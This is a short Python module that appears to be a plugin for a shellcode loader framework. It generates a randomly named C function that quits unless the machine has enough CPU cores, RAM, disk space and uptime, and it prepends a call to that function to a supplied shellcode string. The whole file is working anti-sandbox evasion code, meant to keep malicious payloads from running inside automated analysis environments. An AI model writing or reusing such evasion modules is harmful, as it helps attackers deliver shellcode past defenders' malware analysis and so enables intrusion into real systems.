import random
import string

class physicalmachine:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return f'{self.name}();\n\t' + shellcodestring

    def codeblock(self) -> str:

        return f"""
void {self.name}()
{{
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memInfo;
    ULARGE_INTEGER freeBytesAvailable;
    ULARGE_INTEGER totalBytes;
    ULARGE_INTEGER totalFreeBytes;

    // CPU core count check
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {{
        exit(0);
    }}

    // Physical memory check
    memInfo.dwLength = sizeof(memInfo);
    if (!GlobalMemoryStatusEx(&memInfo)) {{
        exit(0);
    }}

    if (memInfo.ullTotalPhys < (ULONGLONG)2 * 1024 * 1024 * 1024) {{
        exit(0);
    }}

    // Disk capacity check
    if (!GetDiskFreeSpaceExA("C:\\\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {{
        exit(0);
    }}

    if (totalBytes.QuadPart < (ULONGLONG)100 * 1024 * 1024 * 1024) {{
        exit(0);
    }}

    // System uptime check
    ULONGLONG uptime_ms = GetTickCount64();
    if (uptime_ms < 10 * 60 * 1000) {{
        exit(0);
    }}

    return;
}}
"""